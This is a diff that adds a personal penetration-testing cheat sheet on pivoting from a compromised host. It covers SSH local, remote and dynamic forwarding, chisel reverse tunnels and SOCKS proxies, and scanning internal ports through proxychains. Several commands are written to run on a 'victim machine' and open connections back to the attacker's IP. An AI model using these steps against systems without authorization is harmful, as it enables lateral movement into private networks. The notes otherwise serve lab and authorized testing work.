@@ -1,1 +1,96 @@
+Port Forwarding
+ssh
+    Suppose a mysql server is running on a victim machine internally and we cant access it
+    We can fowrward that port process through ssh to our machine and then access it
 
+    This command will be ran on victim machine
+    localport is the port to which we will access that service externaly service port is what is being used by service in the victim machine
+
+    If we are in ssh and see a internal service running on certain port then we can do local port forwarding
+
+    Local Port Forwarding
+    ssh -L(OURlocalport):internal server ip:(internalport) remoteuser@machineip
+
+  #### Remote Port Forwarding
+  This  is used when target dont have ssh running and we cant port forward directly
+  
+  Remote port forwarding means we will forward our desirable port to our ip from the compromised shell.
+  
+  If we our stuck with this option and need to do remote forwarding , first we need to start ssh service (sudo systemctl start ssh) on machine and setup its password,and usernames. But its better to create new ssh keys and using those and removing them after its purpose has been fulfilled.
+ - Now copy the id_rsa.pub contents and add following in /homedir/.ssh/uthorizedkeys
+ 
+` command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty
+ YOUR ID_RSA.PUB ` 
+  
+  This will allow us to to only utilize ssh service for port forwarding so we will be safe out there in Public Internet
+
+we can do the following to create a proxying tunnel just like forward tunneling
+
+This will create a proxy through port 1337 and now we can use tools from our system on target using proxychains command.
+
+NOte: Following command will be run on gained shell and when either we dont have ssh access or ssh is not open on target
+
+    ssh -R 1337 USERNAME@ourIP -i KEYFILE -fN
+
+    Now go to our machine and run the service to which we had to port forward
+
+    Now access the service externaly
+
+    127.0.0.1(we will access the service on this url) (the port which we specified in victim machine when port forwarding)
+
+ssh tunneling Or Proxying(Internal Port scanning)
+
+    ssh -D 127.0.0.1:9050 -N username@ip
+
+    NOw just proxychains rustscan -a 127.0.0.1
+
+   Here 9050 is the port thorugh which traffic will move.We can set it in proxychains.conf or in foxy proxy in webapps case
+
+Chisel port forward
+Remote port forward
+We can use these all for proxying and routing traffic through networks. JUst need to adjust these commands and targets according to the networks infrastrucrure Sometimes when we want to port forward a port of internal network which can be accessed from another internal network then we can replac the localhost ip with the internal server ip.Its not always neccassary that we use 127.0.0.1 because it then only gives us access to port of already compromised sserver,
+
+If ssh is not available and we want to port forward we can use chisel
+
+    Transfer chisel binary to target
+
+    run following in our machine or reciever machine
+
+    chisel server -p 8000 --reverse
+
+    Now run following in victim machine
+
+    ./chisel client 10.4.30.255:8000 R:7777:127.0.0.1:9001
+
+./chisel client (our Ip addresss):Listening-Port R:(port on which to be forward):TARGETIPorLOCALHOST:(Remoteportonwhichserviceisrunning)
+
+    NOw visit 127.0.0.1:7777 to access internal server
+
+Local port forward
+As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.
+On the compromised target we set up a chisel server:
+
+    ./chisel server -p LISTEN_PORT
+
+We now connect to this from our attacking machine like so:
+
+    ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
+
+Chisel proxying
+reverse proxying
+
+the following process will tunnel the connection through port 1080 on our machine which is default port of chisel. We can set chisel socks5 port no in proxychains.conf. Then we can use proxychains with any command and that traffic will be tunneled through specified port.
+
+1- On our local machine start a chisel listener
+
+    ./chisel server -p LISTEN_PORT --reverse &
+
+    Or
+
+    ./chisel server -p LISTEN_PORT --socks5 (If proxyi9ng throu another network)
+
+2- on compromised machine
+
+    ./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
+
+3- Now 127.0.0.1:1080 is connected to compromised machine.
